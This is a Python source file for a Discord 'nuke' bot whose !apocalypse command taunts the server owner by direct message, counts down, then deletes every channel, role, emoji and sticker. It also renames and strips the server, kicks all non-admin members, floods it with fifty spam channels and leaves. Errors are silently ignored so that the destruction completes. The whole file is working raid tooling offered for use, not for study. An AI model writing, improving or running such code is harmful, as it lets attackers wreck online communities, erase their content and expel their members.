import discord
import asyncio
import random
from discord.ext import commands

TOKEN = 'YOUR_TOKEN_HERE'

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} | APOCALYPSE NUKE READY 🌋")

@bot.command()
async def apocalypse(ctx, seconds: int = 10):
    await ctx.send("⚡ **WORLD-ENDING SEQUENCE STARTED!** ⚡")
    
    # DM Owner
    try:
        owner = ctx.guild.owner
        await owner.send("☠️ APOCALYPSE NUKE ACTIVATED. Goodbye. 😈")
    except:
        pass

    # Countdown
    for i in range(seconds, 0, -1):
        await ctx.send(f"**☢️ {i}...**")
        await asyncio.sleep(1)

    await ctx.send("💥 **IT'S OVER!** 💥")

    # Delete channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

    # Delete roles
    for role in ctx.guild.roles:
        try:
            if role.name != "@everyone":
                await role.delete()
        except:
            pass

    # Delete emojis and stickers
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except:
            pass

    for sticker in ctx.guild.stickers:
        try:
            await sticker.delete()
        except:
            pass

    # Rename server
    try:
        await ctx.guild.edit(
            name="☠️ RIP SERVER ☠️",
            description="Destroyed by Apocalypse Bot",
            icon=None,
            banner=None
        )
    except:
        pass

    # Kick members
    for member in ctx.guild.members:
        try:
            if not member.guild_permissions.administrator:
                await member.kick(reason="APOCALYPSE STRIKE 💀")
        except:
            pass

    # Create chaos channels
    for i in range(50):
        try:
            channel = await ctx.guild.create_text_channel(f"💣-boom-{i}")
            await channel.send("☢️ WORLD ENDED ☢️")
        except:
            pass

    # Final message and leave
    await asyncio.sleep(3)
    await ctx.send("🌋 APOCALYPSE COMPLETE. LEAVING 🌋")
    await asyncio.sleep(2)
    await ctx.guild.leave()

bot.run(TOKEN)
